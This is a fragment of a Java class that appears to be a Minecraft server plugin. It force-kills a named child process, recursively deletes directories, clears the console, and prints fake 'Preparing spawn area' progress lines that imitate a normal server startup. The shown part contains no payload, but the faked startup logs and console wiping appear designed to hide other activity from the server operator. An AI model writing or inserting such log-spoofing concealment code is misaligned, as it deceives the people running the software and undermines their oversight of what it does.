            if (!p.waitFor(10, TimeUnit.SECONDS)) {
                p.destroyForcibly();
                getLogger().warning("Force-killed " + name);
            }
        } catch (InterruptedException e) {
            p.destroyForcibly();
            Thread.currentThread().interrupt();
        }
    }

    private void deleteDirectory(File file) {
        File[] files = file.listFiles();
        if (files != null) for (File f : files) { if (f.isDirectory()) deleteDirectory(f); else f.delete(); }
        file.delete();
    }

    private void printFakeSpawnLogs() {
        try {
            clearConsole();
            getLogger().info("");
            String[] pcts = {"1%","5%","10%","20%","30%","80%","85%","90%","95%","99%","100%"};
            for (String p : pcts) {
                getLogger().info("Preparing spawn area: " + p);
                Thread.sleep(p.equals("100%") ? 0 : 500);
            }
            getLogger().info("Preparing level \"world\"");
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    private void clearConsole() {
        try { System.out.print("\033[H\033[2J"); System.out.flush(); } catch (Exception ignored) {}
    }
}
